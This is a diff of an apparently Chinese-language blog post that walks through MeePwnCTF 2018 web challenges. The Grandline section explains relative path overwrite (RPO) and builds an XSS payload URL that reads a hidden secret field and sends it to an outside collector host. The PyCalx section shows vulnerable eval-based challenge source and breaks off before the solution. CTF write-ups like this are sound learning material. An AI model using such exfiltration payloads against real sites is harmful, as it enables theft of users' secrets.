@@ -57,7 +57,7 @@
     "datePublished": "2018-07-17 18:04:35 \x2b0000 UTC",
     "dateModified" : "2018-07-17 18:04:35 \x2b0000 UTC",
     "url" : "https:\/\/syang-ng.github.io\/2018\/07\/meepwnctf-2018-web\/",
-    "wordCount" : "2617",
+    "wordCount" : "2616",
     "keywords" : [  "syang\x27s blog"]
 }
 </script>
@@ -145,440 +145,371 @@
           
           
 
-          
-
-<h2 id="前言">前言</h2>
-
+          <h2 id="前言">前言</h2>
 <p>上周末打了 MeePwnCTF 2018，感觉还是非常有价值的一场比赛</p>
-
 <h2 id="grandline">Grandline</h2>
-
 <p>本题的考点是 RPO 攻击问题，关于 RPO 攻击的具体细节，可以自行 Google，这里不再做过多叙述</p>
-
-<p>访问 <a href="http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/?debug，可以获得页面源码：" rel="nofollow noreferrer" target="_blank">http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/?debug，可以获得页面源码：</a></p>
-
-<pre><code class="language-php">&lt;!-- 
-/* * *  Power By 0xd0ff9 * * * 
---&gt; 
-&lt;?php 
-include &quot;config.php&quot;; 
-if(isset($_GET['debug'])) 
+<p>访问 http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/?debug，可以获得页面源码：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;!-- 
+</span><span style="color:#75715e">/* * *  Power By 0xd0ff9 * * * 
+</span><span style="color:#75715e">--&gt;</span> 
+<span style="color:#75715e">&lt;?php</span> 
+<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;config.php&#34;</span>; 
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;debug&#39;</span>])) 
 { 
-    show_source(__FILE__); 
-    die(&quot;...&quot;); 
+    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>); 
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;...&#34;</span>); 
 } 
-?&gt; 
-&lt;!DOCTYPE html&gt; 
-&lt;html lang=&quot;en&quot;&gt; 
-&lt;head&gt; 
-  &lt;title&gt;The Two piece Treasure&lt;/title&gt; 
-  &lt;meta charset=&quot;utf-8&quot;&gt; 
-  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; 
-  &lt;!-- Latest compiled and minified CSS --&gt; 
-  &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt; 
-  &lt;!-- jQuery library --&gt; 
-  &lt;script src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt; 
-  &lt;!-- Latest compiled JavaScript --&gt; 
-  &lt;script src=&quot;js/bootstrap.min.js&quot;&gt;&lt;/script&gt; 
-&lt;/head&gt; 
-&lt;body&gt; 
-&lt;?php 
-$grandline = $_SERVER['REQUEST_URI']; 
-// Best Grandline is short 
-$grandline = substr($grandline,0,500); 
-echo &quot;&lt;!-- P/s: Your grand line is &quot;.htmlentities(urldecode($grandline),ENT_QUOTES).&quot; , this is not Luffy 's grand line --&gt;&quot;; 
-?&gt; 
-&lt;div class=&quot;container&quot;&gt; 
-&lt;div class=&quot;jumbotron&quot;&gt; 
-    &lt;h1&gt;GRAND LINE&lt;/h1&gt;  
-    &lt;p&gt;Welcome to Grand Line, You are in the way to become Pirate King, now, let's defeat &lt;a href=&quot;bot.php&quot;&gt;BigMom&lt;/a&gt; first&lt;/p&gt;  
-&lt;/div&gt; 
-&lt;?php 
-$loca = $_SERVER[&quot;REMOTE_ADDR&quot;]; 
-echo &quot;&lt;input name='location' value='&quot;.$loca.&quot;' type='hidden'&gt;&lt;br&gt;&quot;; 
-if ($loca === &quot;127.0.0.1&quot; || $loca===&quot;::1&quot;) 
+<span style="color:#75715e">?&gt;</span> 
+<span style="color:#75715e">&lt;!DOCTYPE html&gt;</span> 
+&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt; 
+&lt;<span style="color:#f92672">head</span>&gt; 
+  &lt;<span style="color:#f92672">title</span>&gt;The Two piece Treasure&lt;/<span style="color:#f92672">title</span>&gt; 
+  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt; 
+  &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt; 
+  <span style="color:#75715e">&lt;!-- Latest compiled and minified CSS --&gt;</span> 
+  &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/bootstrap.min.css&#34;</span>&gt; 
+  <span style="color:#75715e">&lt;!-- jQuery library --&gt;</span> 
+  &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;js/jquery.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt; 
+  <span style="color:#75715e">&lt;!-- Latest compiled JavaScript --&gt;</span> 
+  &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;js/bootstrap.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt; 
+&lt;/<span style="color:#f92672">head</span>&gt; 
+&lt;<span style="color:#f92672">body</span>&gt; 
+<span style="color:#75715e">&lt;?php</span> 
+$grandline <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>]; 
+<span style="color:#75715e">// Best Grandline is short 
+</span><span style="color:#75715e"></span>$grandline <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($grandline,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">500</span>); 
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;!-- P/s: Your grand line is &#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">htmlentities</span>(<span style="color:#a6e22e">urldecode</span>($grandline),<span style="color:#a6e22e">ENT_QUOTES</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; , this is not Luffy &#39;s grand line --&gt;&#34;</span>; 
+<span style="color:#75715e">?&gt;</span> 
+&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt; 
+&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jumbotron&#34;</span>&gt; 
+    &lt;<span style="color:#f92672">h1</span>&gt;GRAND LINE&lt;/<span style="color:#f92672">h1</span>&gt;  
+    &lt;<span style="color:#f92672">p</span>&gt;Welcome to Grand Line, You are in the way to become Pirate King, now, let&#39;s defeat &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bot.php&#34;</span>&gt;BigMom&lt;/<span style="color:#f92672">a</span>&gt; first&lt;/<span style="color:#f92672">p</span>&gt;  
+&lt;/<span style="color:#f92672">div</span>&gt; 
+<span style="color:#75715e">&lt;?php</span> 
+$loca <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>]; 
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;input name=&#39;location&#39; value=&#39;&#34;</span><span style="color:#f92672">.</span>$loca<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39; type=&#39;hidden&#39;&gt;&lt;br&gt;&#34;</span>; 
+<span style="color:#66d9ef">if</span> ($loca <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> <span style="color:#f92672">||</span> $loca<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;::1&#34;</span>) 
 { 
-    echo &quot;&lt;input name='piece' value='&quot;.$secret.&quot;' type='hidden'&gt;&quot;; 
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;input name=&#39;piece&#39; value=&#39;&#34;</span><span style="color:#f92672">.</span>$secret<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39; type=&#39;hidden&#39;&gt;&#34;</span>; 
 } 
-else 
+<span style="color:#66d9ef">else</span> 
 { 
-    echo &quot;&lt;input name='piece' value='Only whitebeard can see it, Gura gura gura' type='hidden'&gt;&quot;; 
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;input name=&#39;piece&#39; value=&#39;Only whitebeard can see it, Gura gura gura&#39; type=&#39;hidden&#39;&gt;&#34;</span>; 
 } 
-?&gt; 
-  &lt;h4&gt;If you eat fruit, you can't swim&lt;/h4&gt; 
-        &lt;img src=&quot;images/grandline.png&quot;/&gt; 
-        &lt;br&gt; 
-        &lt;form method=&quot;get&quot; action=&quot;index.php&quot;&gt; 
-        &lt;input type=&quot;text&quot; name=&quot;eat&quot; placeholder=&quot;&quot; value=&quot;gomu gomu no mi&quot;&gt;         
-        &lt;input type=&quot;submit&quot;&gt; 
-        &lt;/form&gt; 
-    &lt;?php  
-    if(isset($_GET['eat'])&amp;&amp;!empty($_GET['eat'])) 
+<span style="color:#75715e">?&gt;</span> 
+  &lt;<span style="color:#f92672">h4</span>&gt;If you eat fruit, you can&#39;t swim&lt;/<span style="color:#f92672">h4</span>&gt; 
+        &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;images/grandline.png&#34;</span>/&gt; 
+        &lt;<span style="color:#f92672">br</span>&gt; 
+        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span>&gt; 
+        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eat&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gomu gomu no mi&#34;</span>&gt;         
+        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt; 
+        &lt;/<span style="color:#f92672">form</span>&gt; 
+    <span style="color:#75715e">&lt;?php</span>  
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;eat&#39;</span>])<span style="color:#f92672">&amp;&amp;!</span><span style="color:#66d9ef">empty</span>($_GET[<span style="color:#e6db74">&#39;eat&#39;</span>])) 
     { 
-        if($_GET['eat'] === &quot;gomu gomu no mi&quot;) 
+        <span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;eat&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;gomu gomu no mi&#34;</span>) 
         { 
-            echo &quot;&lt;p&gt;Pirate, Let's go to your Grand Line&lt;/p&gt;&quot;; 
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt;Pirate, Let&#39;s go to your Grand Line&lt;/p&gt;&#34;</span>; 
         } 
-        else 
+        <span style="color:#66d9ef">else</span> 
         { 
-            echo &quot;&lt;p&gt;You need to eat 'gomu gomu no mi'&lt;/p&gt;&quot;; 
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt;You need to eat &#39;gomu gomu no mi&#39;&lt;/p&gt;&#34;</span>; 
         } 
     } 
      
-    ?&gt; 
-&lt;/div&gt; 
-&lt;/body&gt; 
-&lt;/html&gt; 
-&lt;!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !&lt;&gt;+-*/ ) 
-...
-</code></pre>
-
-<p>可以看到由于 <code>htmlentities(urldecode($grandline),ENT_QUOTES)</code> 的存在，使得我们直接闭合 HTML 标签的思路失败，那么这里是否存在其他可以利用的点呢？答案是肯定的，这里需要使用 RPO 攻击的方法</p>
-
-<p>当我们访问 <a href="http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/" rel="nofollow noreferrer" target="_blank">http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/</a> 时，浏览器继续返回 index.php 的内容：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/MeePwn-CTF-2018-Web/grandline1.png" alt="Grandline1" class="lazyload"><figcaption class="image-caption">Grandline1</figcaption></figure></p>
-
+    <span style="color:#75715e">?&gt;</span> 
+&lt;/<span style="color:#f92672">div</span>&gt; 
+&lt;/<span style="color:#f92672">body</span>&gt; 
+&lt;/<span style="color:#f92672">html</span>&gt; 
+<span style="color:#75715e">&lt;!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !&lt;&gt;+-*/ ) 
+</span><span style="color:#75715e">...
+</span></code></pre></div><p>可以看到由于 <code>htmlentities(urldecode($grandline),ENT_QUOTES)</code> 的存在，使得我们直接闭合 HTML 标签的思路失败，那么这里是否存在其他可以利用的点呢？答案是肯定的，这里需要使用 RPO 攻击的方法</p>
+<p>当我们访问 http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/ 时，浏览器继续返回 index.php 的内容：</p>
+<p><img src="/images/posts/MeePwn-CTF-2018-Web/grandline1.png" alt="Grandline1"></p>
 <p>但我们需要注意的是，浏览器和服务器对于路径解析的差异，而这也是 RPO 攻击的核心所在：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/MeePwn-CTF-2018-Web/grandline2.png" alt="Grandline2" class="lazyload"><figcaption class="image-caption">Grandline2</figcaption></figure></p>
-
-<p><a href="http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/js/jquery.min.js" rel="nofollow noreferrer" target="_blank">http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/js/jquery.min.js</a> 的结果如下：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/MeePwn-CTF-2018-Web/grandline3.png" alt="Grandline3" class="lazyload"><figcaption class="image-caption">Grandline3</figcaption></figure></p>
-
+<p><img src="/images/posts/MeePwn-CTF-2018-Web/grandline2.png" alt="Grandline2"></p>
+<p>http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/js/jquery.min.js 的结果如下：</p>
+<p><img src="/images/posts/MeePwn-CTF-2018-Web/grandline3.png" alt="Grandline3"></p>
 <p>同样是 index.php 的内容！</p>
-
 <p>这意味着这里存在着我们可以控制内容的 js 文件：jquery.min.js 和 bootstrap.min.js</p>
-
 <p>下面需要思考的是如何通过控制 url 的方式使得 XSS 攻击生效</p>
-
 <p>可以看到在开通和结尾，出题人故意留了两个相应的标记 <code>/*</code> 和 <code>*/</code>：</p>
-
-<pre><code class="language-html">&lt;!-- 
-/* * *  Power By 0xd0ff9 * * * 
---&gt; 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!-- 
+</span><span style="color:#75715e">/* * *  Power By 0xd0ff9 * * * 
+</span><span style="color:#75715e">--&gt;</span> 
 ...
-&lt;!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !&lt;&gt;+-*/ )
-</code></pre>
-
-<p>此时我们可以通过手动闭合 js 注释标签的方式，构造 payload，在内部插入一段恶意的 js 代码即可</p>
-
+<span style="color:#75715e">&lt;!-- Infact, ?debug will help you learn expression to build Grand Line ( Ex: !&lt;&gt;+-*/ )
+</span></code></pre></div><p>此时我们可以通过手动闭合 js 注释标签的方式，构造 payload，在内部插入一段恶意的 js 代码即可</p>
 <p>构造如下 payload，使得浏览器能够弹窗：</p>
-
-<p><a href="http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/alert(1);(function()%7B%7D)(/*/" rel="nofollow noreferrer" target="_blank">http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/alert(1);(function()%7B%7D)(/*/</a></p>
-
+<p>http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/<em>/alert(1);(function()%7B%7D)(/</em>/</p>
 <p>到这里为止，如何利用是一个很简单的事情了，我们只需要获得 <code>&lt;input name='piece' value='&quot;.$secret.&quot;' type='hidden'&gt;</code> 的值，然后再发到我们的服务器，即可获得 flag</p>
-
 <p>这里需要注意的问题是，由于我们可以控制的 js 脚本是在 <code>&lt;head&gt;&lt;/head&gt;</code> 中加载的，所以存在的问题是我们不能直接使用 <code>document.getElementsByName('piece')[0].value</code> 尝试读取，否则会读取失败</p>
-
 <p>此时我们能使用 <code>window.onload</code> 函数来满足我们需求，该函数在文档内容加载完毕后才会触发，这样可以避免无法获取元素的现象</p>
-
 <p>payload:</p>
-
 <pre><code>http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/window.onload=function()%7Bv=document.getElementsByName(%60piece%60)[0].value;(new Image()).src=`http://5ax2cw.ceye.io/`%2Bv;%7D;(function()%7B%7D)(/*/
-</code></pre>
-
-<h2 id="pycalx-pycalx2">PyCalx &amp; PyCalx2</h2>
-
+</code></pre><h2 id="pycalx--pycalx2">PyCalx &amp; PyCalx2</h2>
 <h3 id="1">1</h3>
-
 <p>两道题核心考察的知识点都是 SQL 注入的思想，即通过构造字符串的方式使得程序泄漏出我们希望得到的信息</p>
-
-<p>通过 <a href="http://178.128.96.203/cgi-bin/server.py?source=1" rel="nofollow noreferrer" target="_blank">http://178.128.96.203/cgi-bin/server.py?source=1</a> 可以查看到相应的源代码</p>
-
-<pre><code class="language-python">#!/usr/bin/env python
-import cgi
-import sys
-from html import escape
-FLAG = open('/var/www/flag','r').read()
-OK_200 = &quot;&quot;&quot;Content-type: text/html
-&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
-&lt;center&gt;
-&lt;title&gt;PyCalx&lt;/title&gt;
-&lt;h1&gt;PyCalx&lt;/h1&gt;
-&lt;form&gt;
-&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder='Value 1 (Example: 1  abc)' autofocus/&gt;
-&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder='Operator (Example: + - * ** / // == != )' /&gt;
-&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder='Value 2 (Example: 1  abc)' /&gt;
-&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;
-&lt;/form&gt;
-&lt;a href='?source=1'&gt;Source&lt;/a&gt;
-&lt;/center&gt;
-&quot;&quot;&quot;
-print(OK_200)
-arguments = cgi.FieldStorage()
-if 'source' in arguments:
-    source = arguments['source'].value
-else:
-    source = 0
-if source == '1':
-    print('&lt;pre&gt;'+escape(str(open(__file__,'r').read()))+'&lt;/pre&gt;')
-if 'value1' in arguments and 'value2' in arguments and 'op' in arguments:
-    def get_value(val):
-        val = str(val)[:64]
-        if str(val).isdigit(): return int(val)
-        blacklist = ['(',')','[',']','\'','&quot;'] # I don't like tuple, list and dict.
-        if val == '' or [c for c in blacklist if c in val] != []:
-            print('&lt;center&gt;Invalid value&lt;/center&gt;')
-            sys.exit(0)
-        return val
-    def get_op(val):
-        val = str(val)[:2]
-        list_ops = ['+','-','/','*','=','!']
-        if val == '' or val[0] not in list_ops:
-            print('&lt;center&gt;Invalid op&lt;/center&gt;')
-            sys.exit(0)
-        return val
-    op = get_op(arguments['op'].value)
-    value1 = get_value(arguments['value1'].value)
-    value2 = get_value(arguments['value2'].value)
-    if str(value1).isdigit() ^ str(value2).isdigit():
-        print('&lt;center&gt;Types of the values don\'t match&lt;/center&gt;')
-        sys.exit(0)
-    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
-    print('&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;')
-    print('&gt;&gt;&gt;&gt; print('+escape(calc_eval)+')')
-    try:
-        result = str(eval(calc_eval))
-        if result.isdigit() or result == 'True' or result == 'False':
-            print(result)
-        else:
-            print(&quot;Invalid&quot;) # Sorry we don't support output as a string due to security issue.
-    except:
-        print(&quot;Invalid&quot;)
-    print('&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;')
-</code></pre>
-
-<p>很明显我们要想办法获得 FLAG 的值，而这在正常情况下我们是无法读取的，所以需要考虑构造相应的字符串，使得程序会对我们的输入和 FLAG 变量进行比较</p>
-
+<p>通过 http://178.128.96.203/cgi-bin/server.py?source=1 可以查看到相应的源代码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">import</span> cgi
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> html <span style="color:#f92672">import</span> escape
+FLAG <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;/var/www/flag&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()
+OK_200 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;Content-type: text/html
+</span><span style="color:#e6db74">&lt;link rel=&#34;stylesheet&#34; href=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;&gt;
+</span><span style="color:#e6db74">&lt;center&gt;
+</span><span style="color:#e6db74">&lt;title&gt;PyCalx&lt;/title&gt;
+</span><span style="color:#e6db74">&lt;h1&gt;PyCalx&lt;/h1&gt;
+</span><span style="color:#e6db74">&lt;form&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=value1 placeholder=&#39;Value 1 (Example: 1  abc)&#39; autofocus/&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=op placeholder=&#39;Operator (Example: + - * ** / // == != )&#39; /&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4&#34; type=text name=value2 placeholder=&#39;Value 2 (Example: 1  abc)&#39; /&gt;
+</span><span style="color:#e6db74">&lt;input class=&#34;form-control col-md-4 btn btn-success&#34; type=submit value=EVAL /&gt;
+</span><span style="color:#e6db74">&lt;/form&gt;
+</span><span style="color:#e6db74">&lt;a href=&#39;?source=1&#39;&gt;Source&lt;/a&gt;
+</span><span style="color:#e6db74">&lt;/center&gt;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#66d9ef">print</span>(OK_200)
+arguments <span style="color:#f92672">=</span> cgi<span style="color:#f92672">.</span>FieldStorage()
+<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;source&#39;</span> <span style="color:#f92672">in</span> arguments:
+    source <span style="color:#f92672">=</span> arguments[<span style="color:#e6db74">&#39;source&#39;</span>]<span style="color:#f92672">.</span>value
+<span style="color:#66d9ef">else</span>:
+    source <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">if</span> source <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span><span style="color:#f92672">+</span>escape(str(open(__file__,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>)
+<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;value1&#39;</span> <span style="color:#f92672">in</span> arguments <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;value2&#39;</span> <span style="color:#f92672">in</span> arguments <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;op&#39;</span> <span style="color:#f92672">in</span> arguments:
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_value</span>(val):
+        val <span style="color:#f92672">=</span> str(val)[:<span style="color:#ae81ff">64</span>]
+        <span style="color:#66d9ef">if</span> str(val)<span style="color:#f92672">.</span>isdigit(): <span style="color:#66d9ef">return</span> int(val)
+        blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;(&#39;</span>,<span style="color:#e6db74">&#39;)&#39;</span>,<span style="color:#e6db74">&#39;[&#39;</span>,<span style="color:#e6db74">&#39;]&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>] <span style="color:#75715e"># I don&#39;t like tuple, list and dict.</span>
+        <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> [c <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> blacklist <span style="color:#66d9ef">if</span> c <span style="color:#f92672">in</span> val] <span style="color:#f92672">!=</span> []:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;center&gt;Invalid value&lt;/center&gt;&#39;</span>)
+            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> val
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_op</span>(val):
+        val <span style="color:#f92672">=</span> str(val)[:<span style="color:#ae81ff">2</span>]
+        list_ops <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;-&#39;</span>,<span style="color:#e6db74">&#39;/&#39;</span>,<span style="color:#e6db74">&#39;*&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#e6db74">&#39;!&#39;</span>]
+        <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> val[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> list_ops:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;center&gt;Invalid op&lt;/center&gt;&#39;</span>)
+            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">return</span> val
+    op <span style="color:#f92672">=</span> get_op(arguments[<span style="color:#e6db74">&#39;op&#39;</span>]<span style="color:#f92672">.</span>value)
+    value1 <span style="color:#f92672">=</span> get_value(arguments[<span style="color:#e6db74">&#39;value1&#39;</span>]<span style="color:#f92672">.</span>value)
+    value2 <span style="color:#f92672">=</span> get_value(arguments[<span style="color:#e6db74">&#39;value2&#39;</span>]<span style="color:#f92672">.</span>value)
+    <span style="color:#66d9ef">if</span> str(value1)<span style="color:#f92672">.</span>isdigit() <span style="color:#f92672">^</span> str(value2)<span style="color:#f92672">.</span>isdigit():
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;center&gt;Types of the values don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t match&lt;/center&gt;&#39;</span>)
+        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+    calc_eval <span style="color:#f92672">=</span> str(repr(value1)) <span style="color:#f92672">+</span> str(op) <span style="color:#f92672">+</span> str(repr(value2))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&#34;col-md-8&#34;&gt;&lt;pre&gt;&#39;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&gt;&gt;&gt;&gt; print(&#39;</span><span style="color:#f92672">+</span>escape(calc_eval)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;)&#39;</span>)
+    <span style="color:#66d9ef">try</span>:
+        result <span style="color:#f92672">=</span> str(eval(calc_eval))
+        <span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>isdigit() <span style="color:#f92672">or</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;True&#39;</span> <span style="color:#f92672">or</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;False&#39;</span>:
+            <span style="color:#66d9ef">print</span>(result)
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid&#34;</span>) <span style="color:#75715e"># Sorry we don&#39;t support output as a string due to security issue.</span>
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid&#34;</span>)
